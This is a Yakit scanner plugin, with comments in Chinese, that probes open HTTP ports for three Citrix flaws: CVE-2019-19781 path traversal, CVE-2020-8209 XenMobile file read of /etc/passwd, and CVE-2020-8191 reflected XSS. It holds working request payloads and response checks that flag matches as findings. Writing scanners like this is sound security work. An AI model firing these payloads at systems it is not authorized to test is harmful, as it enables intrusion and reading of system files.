# port scan plugin
yakit.AutoInitYakit()

// 准备发送的报文模版 



PacketGet = `GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

`


PacketPost = `POST /menu/stapp HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Encoding: gzip
Content-Length: 2
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

{{params(payload)}}
`
//漏洞检测规则函数 
rules = []
addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
    rules = append(rules, {
        "packet": packet,
        "payload": payload,
        "check": check,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
    })
}


//填充对应的漏洞检测规则
addRule(PacketGet,`/vpn/../vpns/cfg/smb.conf`,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `encrypt passwords`,`name resolve order`){
        return true
    }
    return false
},"目录遍历","citrix-cve-2019-19781-path-traversal","critical","https://www.tripwire.com/state-of-security/vert/citrix-netscaler-cve-2019-19781-what-you-need-to-know/")


addRule(PacketGet,`/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd`,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAllOfSubString(header, `octet-stream`) && str.MatchAllOfRegexp(body, `root:[x*]:0:0:`){
        return true
    }
    return false
},"任意文件读取","citrix-xenmobile-cve-2020-8209","critical","https://nvd.nist.gov/vuln/detail/CVE-2020-8209")


addRule(PacketPost,`sid=254&pe=1%2C2%2C3%2C4%2C5&appname=%0D%0A%3C%2Ftitle%3E%3Cscript%3Ealert%28Mutzqlf%29%3B%3C%2Fscript%3E&au=1&username=nsroot`,func(rsp,header,body){
    if str.MatchAllOfSubString(body, `<script>alert(Mutzqlf);</script>`,`citrix`){
        return true
    }
    return false
},"xss","citrix-cve-2020-8191-xss","critical","https://support.citrix.com/article/CTX276688")




//漏洞检测handle 
handleRule = func(swg, isTls, addr, rule) {
    swg.Add()
    go func{
        defer swg.Done()

        defer func{
            recover()
        }

        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
        if err != nil {
            yakit.Error("poc.HTTP error: %v", err)
            return
        }
        header, body = poc.Split(resp)
        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
        url = urlIns.String()
        if rule.check(rspIns, header, body) {
            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
                risk.titleVerbose(sprintf("reference %v", rule.reference)),
                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
                risk.payload(rule.payload), risk.details({
                    "request": req,
                    "response": resp,
                    "url": url,
                }),
            )
            return
        }
        return
    }
}



handle = func(result) {
    if !result.IsOpen() {
        return
    }

    //判断是否是http
    if len(result.Fingerprint.HttpFlows) <= 0 {
        return
    }
    addr = str.HostPort(result.Target, result.Port)
    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))

    // 漏洞检测
    swg = sync.NewSizedWaitGroup(10)
    for _, rule = range rules {
        handleRule(swg, isTls, addr, rule)
    }
    swg.Wait()
}
